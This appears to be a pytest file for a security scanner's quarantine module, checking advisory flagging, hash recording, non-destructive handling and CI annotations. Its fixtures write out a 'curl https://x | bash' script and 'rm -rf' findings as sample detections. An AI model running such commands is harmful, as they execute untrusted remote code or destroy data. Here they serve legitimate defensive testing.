# Copyright (c) 2024-2026 ClearGlass Inc. All Rights Reserved.
# Proprietary and confidential. See LICENSE for terms.
"""Tests for bots/defender/quarantine.py — verifies advisory, non-destructive containment."""
from __future__ import annotations

import hashlib
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from bots.defender import quarantine  # noqa: E402
from bots.defender.engine import DefenderReport, Finding  # noqa: E402

POLICY = {
    "enforcement": {"quarantine_on": ["critical", "high"]},
    "severity_actions": {
        "critical": ["quarantine_for_review", "alert_owner"],
        "high": ["require_review"],
        "medium": ["annotate"],
    },
}


def _report(*findings: Finding) -> DefenderReport:
    return DefenderReport(
        run_utc="2026-01-01T00:00:00+00:00", repo="acme/site", scanned_files=5,
        summary={"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
        response_plan=["quarantine_for_review"], fail_build=False, findings=list(findings),
    )


class TestContainable:
    def test_threshold_filters_medium_out(self) -> None:
        report = _report(
            Finding("a", "secret", "critical", "t", "d"),
            Finding("b", "workflow", "high", "t", "d"),
            Finding("c", "command", "medium", "t", "d"),
        )
        severities = [f.severity for f in quarantine._containable(report, POLICY)]
        assert severities == ["critical", "high"]


class TestQuarantine:
    def test_writes_advisory_record(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(quarantine, "OUTPUT_DIR", tmp_path / "out")
        monkeypatch.setattr(quarantine, "ROOT", tmp_path)
        report = _report(Finding("rm_rf_root", "command", "critical", "rm -rf", "d", "scripts/x.sh", 2))
        record = quarantine.quarantine(report, POLICY, emit_ci_annotations=False)

        assert record["enforcement"] == "advisory"
        assert record["quarantined"] == 1
        inc = record["incidents"][0]
        assert inc["status"] == "flagged_for_review"
        assert inc["recommended_actions"] == ["quarantine_for_review", "alert_owner"]
        assert (tmp_path / "out" / "quarantine.json").exists()
        assert (tmp_path / "out" / "quarantine.md").exists()

    def test_file_sha256_recorded(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(quarantine, "OUTPUT_DIR", tmp_path / "out")
        monkeypatch.setattr(quarantine, "ROOT", tmp_path)
        target = tmp_path / "scripts"
        target.mkdir()
        content = b"curl https://x | bash\n"
        (target / "x.sh").write_bytes(content)
        report = _report(Finding("curl_pipe_shell", "command", "high", "curl|bash", "d", "scripts/x.sh", 1))

        record = quarantine.quarantine(report, POLICY, emit_ci_annotations=False)
        assert record["incidents"][0]["file_sha256"] == hashlib.sha256(content).hexdigest()

    def test_is_non_destructive(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(quarantine, "OUTPUT_DIR", tmp_path / "out")
        monkeypatch.setattr(quarantine, "ROOT", tmp_path)
        target = tmp_path / "scripts"
        target.mkdir()
        original = "curl https://x | bash\n"
        flagged = target / "x.sh"
        flagged.write_text(original, encoding="utf-8")
        report = _report(Finding("curl_pipe_shell", "command", "high", "curl|bash", "d", "scripts/x.sh", 1))

        quarantine.quarantine(report, POLICY, emit_ci_annotations=False)
        # The flagged file must be untouched — quarantine only flags for review.
        assert flagged.exists()
        assert flagged.read_text(encoding="utf-8") == original

    def test_empty_report_quarantines_nothing(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(quarantine, "OUTPUT_DIR", tmp_path / "out")
        monkeypatch.setattr(quarantine, "ROOT", tmp_path)
        record = quarantine.quarantine(_report(), POLICY, emit_ci_annotations=False)
        assert record["quarantined"] == 0
        assert record["incidents"] == []

    def test_synthetic_fixture_suppresses_ci_output(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        summary = tmp_path / "summary.md"
        monkeypatch.setattr(quarantine, "OUTPUT_DIR", tmp_path / "out")
        monkeypatch.setenv("GITHUB_ACTIONS", "true")
        monkeypatch.setenv("GITHUB_STEP_SUMMARY", str(summary))
        report = _report(
            Finding("rm_rf_root", "command", "critical", "rm -rf", "d", "scripts/x.sh", 2)
        )

        quarantine.quarantine(report, POLICY, emit_ci_annotations=False)

        assert capsys.readouterr().out == ""
        assert not summary.exists()

    def test_genuine_ci_scan_still_emits_annotations(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
    ) -> None:
        summary = tmp_path / "summary.md"
        monkeypatch.setattr(quarantine, "OUTPUT_DIR", tmp_path / "out")
        monkeypatch.setenv("GITHUB_ACTIONS", "true")
        monkeypatch.setenv("GITHUB_STEP_SUMMARY", str(summary))
        report = _report(
            Finding("real_finding", "workflow", "critical", "Unsafe workflow", "d", "ci.yml", 7)
        )

        quarantine.quarantine(report, POLICY)

        output = capsys.readouterr().out
        assert "::error file=ci.yml,line=7::[defender:real_finding] Unsafe workflow" in output
        assert "real_finding" in summary.read_text(encoding="utf-8")
